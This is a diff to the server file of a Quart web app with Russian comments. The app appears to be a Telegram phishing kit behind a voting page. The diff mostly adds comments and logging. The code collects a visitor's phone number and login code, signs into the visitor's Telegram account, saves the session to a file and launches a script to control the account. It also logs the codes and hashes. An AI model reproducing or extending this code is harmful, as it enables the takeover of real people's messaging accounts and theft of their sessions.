@@ -1,3 +1,5 @@
+# server.py
+
 from quart import Quart, request, redirect, url_for, render_template, session as quart_session
 import os
 from telethon import TelegramClient
@@ -54,6 +56,7 @@ async def vote(candidate):
 @app.route('/telegram-number', methods=['GET', 'POST'])
 async def telegram_number_route():
     if request.method == 'POST':
+        # Получение номера телефона
         phone_number = (await request.form)['phone_number']
         quart_session['phone_number'] = phone_number
         logger.debug(f"Получен номер телефона: {phone_number}")
@@ -62,11 +65,19 @@ async def telegram_number_route():
             await create_telegram_client()
             result = await client.send_code_request(phone_number)
             quart_session['phone_code_hash'] = result.phone_code_hash
-            logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
+
+            # Подробный вывод информации после отправки кода
+            logger.debug(f"Код успешно отправлен на номер {phone_number}.")
+            logger.debug(f"Телефон: {phone_number}, phone_code_hash: {result.phone_code_hash}")
+
+            # Отладочный вывод перед переадресацией
+            logger.debug(f"Переадресация на /telegram-code для номера: {phone_number}")
         except Exception as e:
+            # Логирование ошибки, если код не отправился
             logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
             return f"Ошибка при отправке кода: {e}"
 
+        # Переадресация на страницу ввода кода
         return redirect(url_for('verify_code'))
     
     logger.debug("Отображение страницы ввода номера телефона")
@@ -76,34 +87,40 @@ async def telegram_number_route():
 @app.route('/telegram-code', methods=['GET', 'POST'])
 async def verify_code():
     if request.method == 'POST':
+        # Получение кода подтверждения
         verification_code = (await request.form)['verification_code']
         phone_number = quart_session.get('phone_number')
         phone_code_hash = quart_session.get('phone_code_hash')
 
+        # Подробное логирование при проверке кода
         logger.debug(f"Проверка кода для номера {phone_number} с кодом {verification_code} и phone_code_hash {phone_code_hash}")
 
         if phone_number and phone_code_hash:
             try:
+                # Попытка авторизации с помощью введенного кода
                 await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
                 session_str = client.session.save()
 
-                # Проверяем, существует ли директория 'sessions', если нет, создаем её
+                # Сохранение сессии в файл
                 os.makedirs('sessions', exist_ok=True)
                 session_file_path = f"sessions/{phone_number}.session"
                 with open(session_file_path, "w") as session_file:
                     session_file.write(session_str)
-                
+
                 logger.debug(f"Успешная авторизация для номера {phone_number}. Сессия сохранена в {session_file_path}")
 
                 # Запуск скрипта для управления аккаунтом
                 logger.debug(f"Запуск manage_account.py для номера {phone_number}")
                 subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)
 
+                # Переадресация на страницу успеха
                 return redirect(url_for('success_page'))
             except Exception as e:
+                # Логирование ошибки при проверке кода
                 logger.error(f"Ошибка при проверке кода для номера {phone_number}: {e}")
                 return f"Ошибка при проверке кода: {e}"
 
+        # Ошибка, если отсутствует номер телефона или phone_code_hash
         logger.error("Ошибка: Номер телефона или phone_code_hash отсутствуют в сессии.")
         return redirect(url_for('telegram_number_route'))
     
@@ -121,11 +138,6 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     logger.debug(f"Запуск приложения на порту {port}")
     app.run(host='0.0.0.0', port=port)
-
-
-
-
-
 
 
 
